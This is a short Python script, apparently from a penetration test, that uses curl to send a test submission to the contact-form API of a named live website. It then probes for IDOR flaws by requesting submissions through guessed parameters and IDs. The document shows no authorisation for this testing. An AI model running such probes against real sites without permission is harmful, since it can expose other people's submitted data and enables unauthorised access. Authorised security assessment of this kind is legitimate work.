import subprocess, json, os, time
T="https://www.infinitycapital.bh"
OUT="tool_outputs"
os.makedirs(OUT, exist_ok=True)

def curl(args, tag):
    p=subprocess.run(["curl","-s","--max-time","45","-D",f"{OUT}/{tag}.hdr","-o",f"{OUT}/{tag}.bin",
                      "-w","%{http_code}|%{size_download}|%{time_total}"]+args,capture_output=True,text=True)
    body=open(f"{OUT}/{tag}.bin","rb").read()
    return p.stdout, body

def post_send(tag, **f):
    a=["-X","POST",f"{T}/api/send"]
    for k,v in f.items(): a+=["-F",f"{k}={v}"]
    return curl(a, tag)

# 1. baseline reproduce
st,b = post_send("s_base", fname="VAPT", lname="Probe", areacode="+973", tel="12345678",
                 cname="Acme", subject="Interest", msg="Hello there")
print("BASELINE", st, b[:200])
ids=[]
try:
    ids.append(json.loads(b)["data"]["id"])
except Exception: pass

# 2. IDOR - can we read the submission by id?
for suffix in ["","/","/view"]:
    for meth in ["GET"]:
        st2,b2 = curl([f"{T}/api/send{suffix}?id={ids[0]}" if ids else f"{T}/api/send{suffix}"], f"idor_{suffix or 'root'}_{meth}")
        print("IDOR", meth, suffix, st2, b2[:200])
        break

# 3. IDOR variants
for q in ["?id=","?submissionId=","?uid=","/01a0ef7e-a9ca-77ec-b6cc-81bdd7286084","?data.id="]:
    st3,b3 = curl([f"{T}/api/send{q}"], "idor_q")
    print("IDOR q", q, st3, len(b3))
